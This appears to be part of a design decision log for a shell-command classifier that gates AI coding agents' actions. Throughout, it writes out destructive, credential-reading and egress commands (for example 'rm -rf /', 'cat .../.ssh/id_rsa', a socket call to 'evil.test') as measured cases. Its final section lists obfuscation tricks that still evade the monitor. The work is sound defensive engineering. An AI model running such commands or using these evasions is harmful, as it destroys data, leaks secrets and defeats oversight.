The two vocabularies are guarded rather than trusted. The manifests are keyed by
backend id and the chat UI holds sub-chat provider ids, where `claude` is
`claude-code` and `gemini` and `openrouter` have no manifest at all, so
`permission-floor.test.ts` reads the manifests as source text and fails if a
backend declares one floor while the tooltip says another. It reads text rather
than importing the modules because a provider import reaches electron through
`src/main/lib/claude/env.ts` and the vitest config here is node-only by design,
which is also how `no-bypass.test.ts` guards its criterion.

## Decision 25: the native transport refuses the two modes that promise restraint (added 2026-09-19)

The native bridge advertises no `permissions` capability, so it never issues a
permission prompt and no action on it reaches the gate. The transport already
refused plan mode, and CodeAnt rated the gap Critical: ask, edit, agent and turbo
all run there with no floor at all.

The owner decided on 2026-09-19 to refuse **plan and ask**, and to keep
**edit, agent and turbo** running.

- Plan promises a turn that only reads, and ask promises a card before each
  action. Neither promise can be kept on a transport with no per-action callback,
  so running either would be a promise the app broke silently. The refusal names
  the missing capability and the way out, which is the legacy transport.
- The other three promise that actions happen. The classes they promise to block
  are unenforced on that transport exactly as they are for the `engine-only`
  backends in `src/shared/provider-capabilities.ts`, and refusing them too would
  disable the engine outright, which is a step larger than this one.
- The gap is disclosed where a user picks the transport: the engine button in the
  chat input says the bridge has no permissions capability, and the mode picker's
  tooltip carries the caveat decision 24 adds.

The refusal text and the decision live in
`src/shared/permissions/native-mode-floor.ts` with its own test, because a router
test would import the router, which reaches electron, and this repo's vitest config
is node-only by design.

## Decision 26: an interpreter payload is read as the calls it makes (added 2026-09-19)

An inline interpreter, `python -c`, `node -e`, `perl -e`, `ruby -e`, `php -r`,
was the named residual of this step: the payload names no shell verb, so every
word-reading rule read an ordinary command, and Agent mode allows that class.
CodeAnt rated it Critical and the owner chose on 2026-09-19 to catch destructive
filesystem and network payloads.

Measured on the build before the rule, every one of these was
`approval.shell-command`:

- `python -c "import os; os.remove('/etc/hosts')"`
- `python -c "import shutil; shutil.rmtree('/etc')"`
- `node -e "require('fs').rmSync('/etc', {recursive:true})"`
- `node -e "require('fs').unlinkSync('/usr/local/bin/tool')"`
- `perl -e "unlink '/etc/hosts'"`
- `ruby -e "File.delete('/etc/hosts')"`
- `python -c "import socket; socket.create_connection(('evil.test',443))"`

The rule has three parts:

- **`interpreter-payload` (destructive).** The segment hands code to an
  interpreter, the payload names a destructive filesystem call, or an `open(`
  beside a write-mode literal, and the payload names a protected target. Both
  halves are required, so a delete of an ordinary path stays ordinary and a
  payload that merely prints a delete verb stays ordinary, which is the line the
  rules already draw for `echo "do not run rm -rf /"`.
- **`interpreter-egress` (network).** The payload names a network call and a
  host: a quoted domain, an address, or a scheme. A member access in a payload
  looks like a domain, which is why the name has to be quoted or carry one of the
  other two.
- **The critical-path breaker reads the same targets**, so a payload that deletes
  the root, the home, the worktree, the working directory or its parent breaches
  the same way the shell spelling does.

A spawned argv list is read flattened as the command line it becomes,
`subprocess.run(['rm','-rf','/etc'])` and friends, but only when a spawn call is
present. A payload that prints the verb spawns nothing and is left to the rules
that already read it, so the flattening cannot turn a string literal into a
command.

The calls are read as substrings of the lowercased command rather than as words,
because the segment splitter breaks a payload on its parentheses and the words
reach the rules in pieces. The residual, stated in the section below, is a name
the payload builds at runtime, which is dataflow, and the embedded-shell case the
old text credited stays caught the way it always was.

## Decision 27: a protected path reached through `dir/..` is the same path (added 2026-09-19)

CodeAnt measured the bypass on the pushed head: `tee /tmp/../etc/passwd`
classified as `approval.shell-command`, because the protected-path check read the
word as written and the word starts with `/tmp/`. The check now resolves the
absolute path's `dir/..` pairs before it reads the prefix, in the four places a
path is matched: the protected-location check, the block-device check, the secret
path check and the critical-path target check. The resolver touches the text
only, so it costs the classifier nothing it did not already pay.

Only absolute paths are resolved, and a bare `..` stays what it is. A relative
pair climbs from a working directory the gate cannot see, and `criticalTargetKind`
names a bare `..` as the critical target it is from the working directory, so the
two edges stay on opposite sides of the resolver on purpose.

Measured on the build before the rule, each of these was `approval`:
`echo x > /tmp/../etc/passwd`, `tee /tmp/../etc/passwd`,
`tee /tmp/../home/u/.ssh/authorized_keys`, `cp /tmp/k
/tmp/../home/u/.ssh/authorized_keys`, `cat /tmp/../home/u/.ssh/id_rsa` and
`dd if=/tmp/x of=/tmp/../dev/sda`. On the build this record ships with each
classifies `destructive` or `exfiltration` under the rule that names the path it
resolves to, and `ls /tmp/..` and `echo /tmp/../etc/passwd` stay `approval`,
because a path that is merely named is not a write.

## Decision 28: a remote rsync target needs no `@` (added 2026-09-19)

The remote-rsync rule required an `@` or a `://` in a word, so
`rsync myhost.com:/var/www /tmp/backup` classified as `approval.shell-command`.
rsync's manual spells the remote form `[user@]host:path` with the path either
absolute or host-relative, the daemon form `host::module`, and a bracketed host
when the address carries a colon of its own, and neither the `@`, a scheme nor
a dot is part of any of them, so a plain label such as `server:/data` is remote
as well, and so is a host-relative path such as `server:backup`, which rsync
reads against the remote user's home. The check accepts a word whose host part
is longer than one letter and carries no slash, and a bracketed host, which
keeps the local spellings off the rule: the only local spellings that keep a
colon are a drive letter, which is one letter, and a path, where a slash in the
host part keeps the rule off a file that merely contains a colon.

Measured on the build this record ships with, `rsync myhost.com:/var/www
/tmp/backup`, `rsync 10.0.0.5:/data /tmp/backup`, `rsync server:/data
/tmp/backup`, `rsync server:backup /tmp/backup`, `rsync server::module
/tmp/backup` and `rsync [::1]:/data /tmp/backup` classify
`network.egress-command`, and `rsync /tmp/a /tmp/b`, `rsync C:/Users/x
/tmp/backup`, `rsync C:relative /tmp/backup`, `rsync C::module /tmp/backup` and
`rsync a:b /tmp/backup` stay `approval`.

## Decision 29: an interpreter copy or move is judged by its destination (added 2026-09-19)

The check decision 26 added counted every path a payload names, so
`shutil.copy('/usr/bin/python', '/tmp/x')` classified
`destructive.interpreter-payload` although the source is read and the
destination is what gets overwritten. That is the false positive the shell rule
does not have, where a protected operand of `cp` and `mv` is a source. The check
now judges a payload of nothing but copy and move calls by the destination each
call names: `shutil.copy` and its friends, `copyfile` and `copyfilesync` in
their `fs` and `promises` spellings, `shutil.move`, `os.rename`, `os.replace`,
`fs.rename`, `file.rename`, `renamesync` and `movesync`, read as substrings the
way decision 26 reads every other call. Every call in the list takes its
destination second, source then destination, so the check reads the second
quoted path of each call, which is what keeps a later call from hiding an
earlier protected write. A call whose arguments it cannot read falls back to
every path the payload names, the conservative reading.

A delete call, or an `open(` with a write mode, in the same payload keeps every
path in play, and the critical-path breaker reads the source of a payload
separately, so a move of the worktree still reaches it.

Measured on the build before the change, the four spellings with a protected
source and an ordinary destination,
`shutil.copy('/usr/bin/python', '/tmp/x')`,
`os.rename('/etc/passwd', '/tmp/x')`,
`shutil.move('/etc/hosts', '/tmp/x')` and
`fs.copyFileSync('/etc/hosts', '/tmp/x')`, all classified `destructive`. On the
build this record ships with they classify `approval`, the same calls with a
protected destination, `shutil.copy('/tmp/x', '/etc/cron.d/job')` and
`os.rename('/tmp/x', '/etc/cron.d/job')`, classify `destructive` under
`interpreter-payload`, and a two-call payload whose first write is protected,
`shutil.copy('/tmp/a', '/etc/passwd'); shutil.copy('/tmp/b', '/tmp/c')`,
classifies `destructive` as well.

## Decision 30: the working directory by another name, a secret in any case, a table defined once (added 2026-09-19)

Three edges the review round measured on the pushed head, each verified open
before the change and closed after it.

**`$PWD` is the working directory by another name.** Decision 9's breaker names
`.` and `..` as critical because an empty path variable once turned a cleanup
call into a delete of the parent, but `$PWD` and `${PWD}` spelled the same
working directory out, and `rm -rf $PWD` passed the breaker. The target check
now reads the two variable spellings, with or without a trailing slash, the way
it reads `.`, so the delete of the working directory asks rather than runs, in
turbo among the rest. Measured: `rm -rf $PWD`, `rm -rf ${PWD}` and
`rm -rf $PWD/` breach `critical-delete` on the build this record ships with,
and `rm -rf .` still does.

**A tool input path is read the way a command word is.** The secret check
normalised a tool input path's separators and nothing else, so on a
case-insensitive filesystem `C:\Users\me\.AWS\credentials` was an ordinary
read while `cat C:\Users\me\.aws\credentials` was exfiltration, because the
command path lowercases every word before the same patterns read it. The tool
input path is lowercased for the match now, and reported as the caller wrote
it. Measured: `.SSH\authorized_keys`, `.AWS\credentials`, `keys\ID_ED25519`
and `.ENV` name their secrets on the build this record ships with, the lowercase
spellings still do, and an ordinary path still names nothing.

**A table is defined once.** The policy parser walked a repeated `[table]`
header into the table the first one made and merged the keys, although TOML
v1.0 forbids the second header and decision 6 says a file the parser cannot read
fails closed rather than widens. The parser now marks every table a header or a
dotted key creates, and a header that names a marked table is a parse error the
policy loader turns into the deny-by-default floor. Measured:
`[a]` after `[a]`, `[a]` after `[a.b]`, and `[a]` after `a.b = "1"` each fail
with `duplicate table header`, and `[a]` followed by `[a.b]` still parses,
which is the spelling the supported subset exists to read.

**A basic string takes the unicode escapes.** The reader translated the short
escapes only, so a valid basic string such as `b = "caf\u00e9"` was a parse
error, and the policy file that carried it fell back to the shipped floor
without telling the user whose policy was not in effect. The reader now takes
`\uXXXX` and `\UXXXXXXXX` with their hex digits validated, and rejects a
surrogate at either width, because TOML takes only unicode scalar values.
Measured: `"\u00e9"` reads as the accented letter and `"\U0001F600"` as the
pictograph on the build this record ships with, and a bad digit, a missing
digit, a surrogate at either width and a code point past `0x10FFFF` each fail
with `malformed string value`.

## Decision 31: a one-member glob reads as the word it resolves to, and every exec predicate is read (added 2026-09-19)

Two review findings on the pushed head, each verified open before the change
and closed after it.

**A bracket that names one character is one word.** The shell expands `r[m]`
to `rm` before it runs, so `/bin/r[m] -rf /` was a delete that read as an
unknown verb and took the residual approval class. The verb read now resolves
a command word made of plain characters and one-member bracket classes to the
single word it is, and that is the only glob the classifier claims: a range, a
negation, a wildcard, a multi-member class and a parameter spelling such as
`who$@ami` resolve to many words, and that is the deobfuscation residual the
section below names. Measured: `/bin/r[m] -rf /` breaches
`recursive-force-delete` the way `rm -rf /` does, and `su[d]o rm -rf /` reads
its verb past the bracketed wrapper, on the build this record ships with.
`no[p]e rm -rf /tmp/x` stays approval, because it names no command at all.

**Every exec predicate is read, not just the first.** `findDeletes` read the
first `-exec` it found and stopped, so `find / -type f -exec echo {} \;
-exec rm {} +` was an ordinary command: the benign first predicate was a
shield for the delete behind it. The check now reads every `-exec`,
`-execdir`, `-ok` and `-okdir` the segment carries, and the escaped
terminators `\;` and `\&` that end a predicate are arguments like the
escaped parentheses already were, so the second predicate stays in the segment
its `find` carries. Each predicate is read with `readVerb`, so the wrapper,
the assignment and the flags a predicate puts in front of its delete are
stepped over the way a leading `sudo rm` is. Measured: `find / -type f -exec
echo {} \; -exec rm {} +`, `find / -type f -ok rmdir {} \; -exec rm -rf {} +`,
`find / -exec sudo rm -rf {} +` and `find / -exec env FOO=1 rm {} +` classify
`bulk-find-delete` on the build this record ships with, `find . -name '*.log'
-exec echo {} ;` stays approval, and a range, `find . -name '*.log' -exec
r[m-n] {} ;`, stays approval because it names no delete verb.

## Decision 32: a backslash is a quote in a word and a separator in a path, SQL is read where a database hears it, an @ needs its colon, and a refusal precedes the register (added 2026-09-19)

Four review findings on the pushed head, each verified open before the change and closed after it.

**A backslash has two jobs, and the word decides which.** The normaliser turned every backslash into a forward slash, which is what makes `C:\Users\me\.ssh\id_rsa` reach the `.ssh/` rule. The same rewrite split `r\m` into `r/m` and took `m` as the verb, so the alias-step spelling of the delete, `r\m -r\f /`, read as an unknown verb and took the residual approval class. A backslash in a word that already looks like a path (a slash or a drive colon is in it) stays a separator, and a backslash in a plain word is stripped as the shell's character quote, which is the shell's own reading. Measured on the build this record ships with: `r\m -rf /` and `r\m -r\f /` breach `recursive-force-delete`, `\rm -rf /` still does, and `cat C:\Users\me\.ssh\id_rsa` still reports `secret-command`.

**A DROP is destructive where a database hears it.** `hasDestructiveSql` regexed the whole command, so `echo "DROP TABLE users"` classified destructive. The check now reads only the segments whose verb is a database client, `psql`, `mysql`, `mariadb`, `sqlite3`, `sqlcmd`, `pgcli`, `mycli` and `sqlplus`, and it reads the client's own words. A statement in a script file, `mysql db < drop.sql`, stays approval, and that is the script-on-disk residual this section already names. Measured: `psql -c "DROP TABLE users"` and `sqlite3 db "TRUNCATE DATABASE prod"` still breach `destructive-sql`, and `echo "DROP TABLE users"` is approval.

**An @ without a colon is a filename.** The rsync remote check counted any `@` in a word as a host, so `rsync -av ./backup@2024 /tmp/x` asked for the network card. The `@` shortcut is gone, because it was redundant from the start: `user@host:/data` is already remote through the host part, which is `user@host`, a label with no slash and more than one letter. Measured: `rsync -av ./backup@2024 /tmp/x` is approval, `rsync user@host:/data /tmp/backup`, `rsync server:/data /tmp/backup` and `rsync server::module /tmp/backup` stay network, and `rsync C:/Users/x /tmp/backup` stays approval.

**A refusal precedes the register.** The native chat subscription called `registerTurn` while setting up, and the mode floor ran later, inside the turn's producer. A plan or ask request on a backend the floor refuses therefore cancelled the native turn it replaced before the refusal reached the user. The floor now runs before the register, and the refusal emits directly, because nothing else of the refused turn exists to tear down. The refusal text and the two refused modes are unchanged, so `native-mode-floor.test.ts` still holds.

## Decision 33: chroot carries its root, and the find loop reads its flags once (added 2026-09-19)

A CodeRabbit finding and the two SonarCloud marks on the pushed head, each
verified before the change and closed after it.

**`chroot` is a wrapper that also carries a root.** `chroot` was in the wrapper
set, but the wrapper consumer skipped no operand for it, so `chroot /mnt rm -rf /`
read its verb as `mnt`, the root, and the delete behind it took the residual
approval class. The consumer now steps over `chroot`'s options, with the
value-taking ones carrying their values, and counts the required root operand
with them, so the verb read lands on the command the root jail runs. Measured on
the build this record ships with: `chroot /mnt rm -rf /`,
`chroot --skip-chdir /mnt rm -rf /` and
`chroot --userspec root:root /mnt rm -rf /` breach
`destructive.recursive-force-delete`, `find / -exec chroot /mnt rm -rf {} +`
breaches `destructive.bulk-find-delete`, and `chroot /mnt ls /` stays approval.

**The find loop reads its flags in one pass.** `findDeletes` walked the segment
flag by flag, and its per-predicate read made its cognitive complexity 17, one
over SonarCloud's limit of 15. The flags are now collected in one pass, each
predicate is the words between its flag and the next, and the per-predicate read
lives in `predicateExecutesDelete`. The loop sits under the limit, and the
measured verdicts of decision 31 are unchanged on the build this record ships
with. The same pass removed the duplicated cancel block in the native
subscription, which now shares `cancelTurn`, so the duplication mark on the
branch's new code comes off as well.

## Decision 34: a value flag carries its value, `dd` writes where `of=` says, and in-place `sed` writes its files (added 2026-09-19)

Three gaps found in the final deep pass against the pushed head, each verified
as `approval` before the change and closed after it.

**A value flag between the verb and the subcommand carried its value.** The
subcommand reader stepped over git's value flags and only git's, so
`docker -f compose.yml run` read its subcommand as `-f`, took the residual
approval class, and Agent mode allowed a container that starts on the default
bridge network. The reader now steps over the value-taking globals of every
subcommand-scoped verb it serves: the docker and podman file, host, config and
context options, the npm, yarn and pnpm registry, prefix, cache and config
options, gh's hostname, and cargo's manifest path. The segment words are
lowercased before the reader runs, so the single-letter host flag is read as
its lowercase form, which treats `-h` as a value flag. The cost is a line that
prints help and exits, and no shell runs such a line's subcommand.

**`dd` names its output with `of=`.** The protected-path check read `dd`
through the ordinary write-verb read, which never looked at the `of=` word, so
`dd if=/dev/zero of=/etc/passwd` took the residual approval class while the
block-device check caught the same spelling only when the device was a block
device. `dd` now writes where its `of=` value says in every read that asks
where the verb writes, and the block-device check delegates to the same read.

**`sed` writes the files it names only in place.** The classifier read `sed`'s
files as read targets in every spelling, so `sed -i 's/a/b/' /etc/passwd` took
the residual approval class, and an in-place edit of a key reported a secret
read rather than the protected-path overwrite it is. The write read now treats
in-place `sed`, including the spelling that glues a backup suffix onto the
flag, as a verb that rewrites every file it names, and the secret check agrees,
so the denial names the overwrite. A `sed` without the flag still prints to
standard output, and its files stay reads.

Measured on the build this record ships with: `docker -f /tmp/compose.yml run
alpine echo hi`, `podman -H unix:///tmp/sock.sock run alpine`,
`npm --registry https://registry.mirror.example/ publish` and
`gh --hostname enterprise.corp api repos` breach `network.egress-command`,
`dd if=/dev/zero of=/etc/passwd` and `sed -i 's/a/b/' /etc/passwd` breach
`destructive.protected-path-overwrite`, and the plain forms, `sed 's/a/b/'
/tmp/notes.txt`, `dd if=/dev/zero of=/tmp/disk.img` and
`docker -f /tmp/compose.yml ps`, stay approval.

## Decision 35: the long in-place spelling, and a native answer settles only the approval it answered (added 2026-09-19)

Two findings on the head that closed decision 34, each verified before and
closed after.

**`sed` takes its backup suffix after an equals sign too.** GNU `sed` writes
`--in-place[=SUFFIX]`, so `sed --in-place=.bak 's/a/b/' /etc/passwd` is the
same overwrite as `sed -i.bak`, and the in-place flag read of decision 34
matched only the glued short form and the bare long form. The read now takes
the `=` spelling as well, and the plain-form near-miss of decision 34 is
unchanged.

**A native approval answer settles only the approval it answered.** The SDK
path's registry in `tool-approval.ts` already holds the invariant that a card
which is gone cannot settle a newer run for the same sub-chat, because it
resolves by the tool use id the engine handed out. The native path resolved
by sub-chat alone: the engine call carries the request id, but once the engine
accepted the answer, the run left `waiting_approval` whatever approval the run
was actually waiting on. A stale or duplicated id the engine accepted as a
no-op could therefore flip a different approval out of its pending state. The
native path now records the request id of each permission card when the card
chunk is emitted, clears it with the turn, and settles the run only when the
answered id is the id the sub-chat is waiting on. A process restart empties
the registry, so an answer after a restart settles nothing and the run keeps
its pending state until the turn settles, which is the conservative reading.

## Decision 36: the remaining value flags, the drop a client can drop, and chroot's group list (added 2026-09-19)

Three review findings on the head that closed decision 35, each verified as a
real miss before the change and closed after it.

**The subcommand read skips docker and podman's remaining value flags.** The
set of decision 34 held the file, host, config and context globals, but the
daemons carry more, and `docker --log-level debug run alpine` read its
subcommand as `debug` and took the residual approval class. The set now also
skips the log-level, log-driver, TLS certificate and podman certificate
directory globals, with the single-letter log-level form read in its lowercase
form as with the host flag. The `-D` and bare-subcommand near-misses are
unchanged.

**The destructive SQL read reaches every object a client can drop.** The read
matched DROP and TRUNCATE against a fixed table, database and schema word, so
`TRUNCATE users` and `DROP VIEW customer_export` took the residual approval
class in Agent mode. TRUNCATE now takes its table with or without the TABLE
keyword, which is why its argument is an identifier, and DROP reaches every
object type a client can drop, a column among them. A read of the table and a
truncate with no table stay approval. The two patterns stay separate and the
object types stay a set: the single pattern that listed the types in an
alternation came in at a complexity of 27 against the analyzer's limit of 20,
and its two character classes held both cases of the letters while the `i`
flag made them duplicates, which is why each class names one case and the
type list lives in code.

**chroot carries its group list with its flag.** The wrapper's value flags
omitted `--groups`, so `chroot --groups root /mnt rm -rf /` consumed `root` as
the root operand and read `/mnt` as the verb. The flag now carries its value,
which is what keeps the root operand on the path and the verb on the delete.

## Decision 37: a target-bearing DROP is destructive, whatever the object type (added 2026-09-19)

A finding on the head that closed decision 36, and it is the flaw in the fix
itself. The DROP read checked the word after DROP against a list of object
types, and a list is a hole: `DROP TYPE money`, `DROP TABLESPACE fast` and
`DROP MATERIALIZED VIEW mv` are all drops a client can run, and none of the
words is on the list, so each took the residual approval class in Agent mode.
The read is now structural: DROP followed by the object type and a target is
destructive, whatever the type, and a DROP without a target is incomplete SQL
that errors, so it stays a near-miss. The list is gone, which leaves nothing
to maintain under the analyzer's complexity limit, and the TRUNCATE read of
decision 36 is unchanged.

## Decision 38: a quoted backtick is literal, and the two-word type keeps its target (added 2026-09-20)

Two findings on the head that closed decision 37, each verified before and
closed after.

**Backticks split the statement where the shell runs them, and nowhere
else.** The segment split treats a backtick as a boundary, which is the
shell's command substitution, and a substituted command has to reach the
rules as its own segment. The shell runs that substitution inside double
quotes as well as unquoted, so `echo "\`rm -rf /\`"` splits, and the delete
is read, while the substitution is literal inside single quotes and after an
escape, and a literal must not split the statement in two. Single quotes are
the spelling that carries a backtick-quoted SQL identifier, and without the
distinction `mysql -e 'DROP TABLE \`users\`'` split into a DROP without a
target and a stray word, and fell to the residual approval class. The split
now drops the literal backticks before it splits, with the escapes and the
quote state kept honest as it walks, and leaves the active ones where the
substitution split needs them.

**MATERIALIZED VIEW is the one two-word type.** The structural read of
decision 37 parsed its words as the type and the target, so `DROP
MATERIALIZED VIEW` without a target was still classified destructive. The
read now takes the two words as the type, with a target required after them,
and a DROP without a target is incomplete SQL that errors, so it stays a
near-miss, the same reading as a `DROP TABLE` with no name.

## Decision 39: the segment split runs the command the way the shell runs it (added 2026-09-20)

Two findings on the head that closed decision 38, each verified before and
closed after, and both the same mistake: the split treated text inside quotes
the way it treats text outside them.

**A backslash is literal inside single quotes.** The scan started an escape
on a backslash wherever it sat, so in `echo 'x\' ` + "`rm -rf /`" the
closing quote was consumed by the escape, the quote stayed open, and the
substitution that follows the closed string read as literal and fell to
approval. The shell runs that `rm -rf /`. The scan now opens no escape inside
single quotes, and the quote closes where the shell closes it.

**An operator inside quotes is not a boundary.** The split cut on `;`, `|`,
`(`, `)` and newlines wherever they sat, so `echo "example; rm -rf /"`
split into a `rm` segment and the harmless echo was denied as a delete. The
split is now a walk that keeps the quote state, and only an operator the
shell would run starts a segment: outside quotes, and for the substitutions,
the backtick and `$(`, also inside double quotes, where they are active. One
pass does what the backtick pass and the split regex did, and the two-word
state stays on a small object the step advances.

The walk's first head lost `$(` inside double quotes, and a delete in
`echo "$(rm -rf /)"` hid behind the echo until the review round caught it.
The raw forced-branch-delete check made the mirror-image mistake, reading a
delete out of a quoted argument: it now skips the stretch the shell would not
run, the fully single-quoted one and the double-quoted one that holds no
substitution, and it checks every occurrence, because the first can sit in a
literal while a real one follows on the same line.

**The substitution is a nested context, and the literal stretch respects it.**
The next review round found the mirror pair of those mistakes, and both were
real. A substitution inside double quotes left the outer quote state live
across the `$(`, so the `;`, `&&` and `|` inside read as ordinary characters
of the segment that starts at `echo`, and `echo "$(echo ok; rm -rf /)"` hid
the delete the substitution runs. The walk now opens a context at each `$(`
and backtick it runs, parks the interrupted quote state on the context, and
hands it back at the closer, so the operators inside a substitution delimit
the commands it runs the way the shell runs them, and an operator after the
closed span still delimits. The mirror image was the raw check's literal
stretch, which treated a double-quoted span that carried a substitution as
entirely executable, so `echo "git branch -D docs $(date)"` — where the delete
is the argument to echo and `date` is the only thing that runs — denied as the
delete it prints. The stretch is now read per character from the same walk: a
character is literal where the shell would print it without running it, inside
single quotes or inside double quotes while no substitution is open, and a
match is skipped only where every character of it is.

## Decision 40: a key is one spelling, and the reader says no to the rest (added 2026-09-20)

The key segment reader concatenated whatever followed a quoted fragment, so
`"appro"val = "allow"`, which the spec rejects, became the valid key
`approval`. A typo could then stand in for a policy key the reader honours,
which is the widening direction this parser exists to prevent. A segment is
now one spelling, a bare key or a string, and anything after the string that
is not a dot or the end of the line is a malformed key. The spaces a key may
sit in, at the line edges and around the dots, are skipped where they are
legal and nowhere else, and a trailing dot with no segment after it is still
the malformed path it is.

## Decision 41: a host is a quoted label in argument position, and the predicate is tested on the word it runs (added 2026-09-20)

Two review findings, each verified against the built classifier before and
closed after.

**The interpreter-egress host takes a single label in argument position.**
The host literal required the dotted quoted host, so
`socket.create_connection(('evil', 443))` and
`http.client.HTTPConnection('localhost')` — the host a local service name,
which is as reachable a target as a dotted one — fell to approval, which Agent
mode allows without a card. A quoted single label now counts where the
connect calls take the host, before the `,` or the `)`. The trade is stated
rather than hidden: a payload that names a network call and a quoted word in
argument position that is data rather than a host now reads as egress and asks
for a card instead of running. The floor's direction when the two cannot be
told apart is the ask, and a host the payload builds at runtime,
`create_connection((host, 443))`, stays in the residual below, with no
literal to read.

**The find exec predicate is tested on the word it runs.** The predicate
check read the executable from the first word only, so
`find . -exec env FOO=1 /tmp/run.sh {} +` — a wrapper and an assignment
between the exec flag and the script the shell runs per matched file — fell to
approval while the same script with nothing in front of it was destructive.
The delete test now also runs on the word the verb finder resolves past the
wrapper and the assignment, with the same path and script-suffix tests the
first word gets. Bare script execution outside a find, `env FOO=1
/tmp/run.sh` and `bash /tmp/run.sh`, stays approval, the on-disk-script
residual in the section below, where the behaviour is in a file the
classifier does not read.

## Decision 42: the argv is what the call passes, and the mount is what the word names (added 2026-09-20)

The next review round found one false positive, one missed spelling, and two
stale claims, each verified against the built classifier.

**Only the spawn call's argument list is an argv.** The flattening read that
reaches the word rules through a payload that also prints a delete verb,
`subprocess.run(['ls']); print('rm -rf /')`, and the printed text reached the
delete rule as a command the payload never runs. It was denied as a recursive
force delete. The flattening now reads the argument list of each spawn call,
from its open paren to the matching close, and joins those lists, so the
string form and the list form still reach the rules and the printed text
stays what it is. A call name held in a variable, `run = subprocess.run`,
names no open paren after the name and stays in the constructed-name
residual below.

**The separated --mount spelling names the host in its own word.**
`docker run --mount type=bind,source=/,target=/host alpine rm -rf /host`
classified network for the pull, which turbo allows, because the mount reader
knew the glued `--mount=type=bind,source=...` and not the separated one,
where the specification is the word after the flag. A word that names the
key now carries the host the way the glued spelling does, and
`type=bind,source=./src,target=/app` stays ordinary, because the host side
is the worktree-relative path it is.

**Two stale claims, corrected where they sit.** Decision 18 claimed that
matching `/dev/tcp/` catches the url-encoded form too; a percent-encoded
spelling carries no literal path and the classifier does not decode it, so
the claim now names the wrapped form, which it catches, and the encoding
joins the residual below. The verification table said Turbo refuses to carry
a secret out without naming the backend, while the same document's checklist
says every backend but Claude is engine-only; the row now says the rows are
the Claude backend and points at the item that names the reach.

## Decision 43: the paren closes what it opened, and the wrapper takes its operand (added 2026-09-20)

The review round that read decision 42 found three more, each verified
against the built classifier.

**A nested subshell closes its own paren.** The `$()` context closed at the
first `)` it saw, so in `echo "$( (echo ok); rm -rf / )"` the subshell's
`)` restored the outer double quote, and the `; rm -rf /` after it read as
a quoted stretch of the segment that starts at `echo`. The context now
carries the paren depth inside it: the `$(` opens at depth one, an unquoted
`(` deepens it, and only the `)` that brings the depth back to zero closes
the context and hands the quote state back.

**The wrapper's operand goes with the wrapper.** The carried-executable
finder skipped a wrapper but left its operand standing, so in
`find . -exec chroot mnt /tmp/run.sh {} +` the relative root `mnt` read as
the executable, and neither the path check nor the script-suffix check saw
the script the predicate runs per matched file. The finder now consumes the
operand with the wrapper the way the verb finder does, so `chroot mnt` and
`su root` step over their operands and the check reaches `/tmp/run.sh`.

**A quoted IPv6 literal is a host in the same argument position.** The
quoted-name forms knew the dotted label and the single label, so
`socket.create_connection(('::1', 443))` and
`socket.create_connection(('2001:db8::1', 443))` fell to approval, which
Agent mode allows without a card. A quoted hex-and-colon name now counts in
the argument position the connect calls take it, before the comma or the
closing paren, loopback and non-loopback alike.

## Decision 44: a quoted paren stays literal (added 2026-09-20)

Kilo found, while decision 43 was being fixed, that the rewrite moved the
`)` read ahead of the double-quote guard: a `)` inside a live double quote
split the segment, so `echo ")rm -rf /"` read the printed text as a
destructive segment of its own, which Agent mode would have denied for a
string the shell only prints. The guard is back: a `)` the shell would print
is an ordinary character even inside a substitution opened within the same
quotes. The substitution's own closer stays reachable, because opening `$(`
resets the quote state, so a `)` that closes the context is always
unquoted.

## The residual gap, stated rather than closed

Every command in this section was run against the built classifier on 2026-09-19
and still classifies as `approval`, which Agent mode allows and turbo runs with no
prompt. The list is shorter than it was, and the boundary moved rather than
disappeared.

Still evading, verified:

- **A relative `dir/..` pair the gate cannot resolve.** Decision 27 resolves
  absolute paths only, because a relative pair climbs from a working directory the
  classifier does not see, and `echo x > ../etc/passwd` is the write of
  `/etc/passwd` from any directory whose parent holds the protected tree.
- **A script written to disk and then run.** `python /tmp/evil.py`, `bash /tmp/x.sh`.
  The behaviour is in the file, and reading it to decide would mean executing it.
- **An interpreter payload that builds its call's name at runtime.** The
  interpreter rules added by decision 26 read the calls a payload makes, and every
  literal call is caught, so the miss is a name the payload constructs:
  `python -c "getattr(os, 'rem'+'ove')('/etc/hosts')"` and `node -e
  "const f=require('fs')['rm'+'Sync']; f('/etc')"` both still classify as
  `approval.shell-command`, measured on the build this record ships with. Reading
  a constructed name is dataflow, and closing that is the denylist race the last
  bullet describes.
- **A secret named across two segments.** `cd ~/.aws && cat credentials` puts the
  directory in one segment and the bare filename in the next, so no single word
  carries a full secret path. Following a value from one segment into the next is
  data lineage, which is what a real product in this space sells, and it is out of
  scope for a classifier that is a pure function of one command string.
- **Globs that resolve to more than one word, and parameter spellings the shell
  resolves at exec time.** `/usr/bin/p?ng` is `ping`, `r[m-n]` is `rm` or `rn`,
  `who$@ami` is `whoami`. The classifier sees the text before the shell expands
  it, and a bracket that names one member is the one glob it does resolve, by
  decision 31.
- **Hex and octal escapes, percent encoding, base64 payloads, alias definitions, heredocs.** A
  published bypass write-up reaches the conclusion directly: every interpreter a
  denylist misses is a bypass, every quoting trick it misses is a bypass, and the
  fix that worked was to remove the shell tool and put an OS sandbox in front of it.
  A normaliser that does nine text-level rewrites still lists adversarially nested
  obfuscation as a limitation by design.

No longer evading, which the earlier text of this section claimed and was wrong
about:

- `python -c "import os; os.remove('/etc/hosts')"` and `node -e
  "require('fs').rmSync('/etc', {recursive:true})"` are caught, by decision 26.
  The rule reads the call a payload makes and the path it names, and it needs both,
  so a payload that deletes an ordinary path stays in the approval class. A spawned
  argv list, `subprocess.run(['rm','-rf','/etc'])`, is read flattened as the command
  line it becomes, and a socket call that names a host is network.
- `c"h"m"o"d 777 /` is caught. Quotes come off every word before the verb is read,
  so quoted-substring reconstruction resolves to `chmod`. `c$()url` is caught the
  same way, because the splitter breaks on `$(`.
- `python -c "import os; os.system('rm -rf /')"` is caught. The splitter breaks on
  parentheses, and the inner `rm -rf /` becomes a segment of its own whose verb is
  `rm`. That is luck rather than design, and it is recorded here because claiming
  credit for it would overstate the guarantee.
- `\rm -rf /` and `rm$IFS-rf$IFS/` are caught, by decision 20.
- `/usr/bin/n[c]` and `/bin/r[m]` are caught, by decision 31. A bracket that
  names one member resolves to the single word it is, and the resolved word is
  what gets classified.

So the claim stays precise and is now narrower than it was. This step puts a floor
under the commands the classifier can read. It does not contain arbitrary code
execution, and that needs an OS-level boundary around the spawned process, which is
a roadmap item of its own. `docs/backend-porting-recipe.md` section 7 tells a porter
to publish the same limitation rather than claim otherwise.

## What is app-enforced and what is engine-enforced

